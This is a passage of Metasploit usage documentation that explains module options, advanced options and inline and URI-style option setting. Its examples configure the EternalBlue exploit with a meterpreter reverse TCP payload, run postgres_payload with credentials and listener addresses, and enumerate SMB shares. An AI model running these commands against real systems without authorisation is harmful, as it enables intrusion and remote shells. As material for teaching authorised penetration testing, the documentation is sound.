## Module options

Each Metasploit module has a set of options which must be set before running. These can be seen with the `show options` or `options` command:

```msf
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   ... etc ...


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.239    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Each Metasploit module also has _advanced_ options, which can often be useful for fine-tuning modules, in particular setting connection timeouts values can be useful:

```msf
msf6 exploit(windows/smb/ms17_010_eternalblue) > advanced

Module advanced options (exploit/windows/smb/ms17_010_eternalblue):

   Name                    Current Setting                     Required  Description
   ----                    ---------------                     --------  -----------
   CHOST                                                       no        The local client address
   CPORT                                                       no        The local client port
   CheckModule             auxiliary/scanner/smb/smb_ms17_010  yes       Module to check with
   ConnectTimeout          10                                  yes       Maximum number of seconds to establish a TCP connection
   ... etc ...

Payload advanced options (windows/x64/meterpreter/reverse_tcp):

   Name                         Current Setting  Required  Description
   ----                         ---------------  --------  -----------
   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
   AutoRunScript                                 no        A script to run automatically on session creation.
   AutoSystemInfo               true             yes       Automatically capture system information on
   ... etc ...
```

You can see which options stilloptions to be set with the `show missing` command:

```msf
msf6 exploit(windows/smb/ms17_010_eternalblue) > show missing

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
```

### Setting options

Traditional usage of Metasploit involves loading a module, and setting multiple options individually:

```
use exploit/linux/postgres/postgres_payload
set username administrator
set password pass
set rhost 192.168.123.6
set rport 5432
set database postgres
set lhost 192.168.123.1
set lport 5000
run
```

You can also specify multiple RHOSTS separated by spaces or with a CIDR subnet mask:

```
set rhosts 127.0.0.1 127.0.0.2
set rhosts 127.0.0.1/24
```

In 2021 support for running a module and specifying module options at the same time was added, dubbed inline option support. This workflow will not only make it easier to use `reverse-i-search` with `CTRL+R` in Metasploit's console, but it will also make it easier to share cheat sheets amongst pentesters.

Example:

```
use exploit/linux/postgres/postgres_payload
run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64' verbose=true
```

You can set complex options using quotes. Example:

```
set COMMAND "date --date='TZ=\"America/Los_Angeles\" 09:00 next Fri' --iso-8601=ns"
```

### URI support for RHOSTS

Metasploit also supports the use of [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier) strings as arguments,
which allows setting multiple options at once - i.e. username, password, rport, rhost, etc.

```
use exploit/linux/postgres/postgres_payload
run postgres://administrator:pass@192.168.123.6 lhost=192.168.123.1 lport=5000
```

The following protocols are currently supported, and described in more detail below:

- cidr - Can be combined with other protocols to specify address subnet mask length
- file - Load a series of RHOST values separated by newlines from a file. This file can also include URI strings
- http
- https
- mysql
- postgres
- smb
- ssh

To preserve whitespace, regardless of the protocol, use quotes:

```
use auxiliary/admin/postgres/postgres_sql
run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()'
```

In some scenarios it may be too troublesome to escape quotes within a password. In this scenario it is possible to still set the password option manually and use the URI argument without a password specified, the module will gracefully fallback to using the manually set password:

```
set password !@£$%^&*()"'
run smb://user@192.168.123.13
```

You can also specify multiple RHOST arguments, as well as provide additionally inlined options:

```
use scanner/smb/smb_enumshares
run smb://test:test@192.168.1.223 smb://user:password@192.168.1.223 smb://test:test@127.0.0.1 verbose=true
```
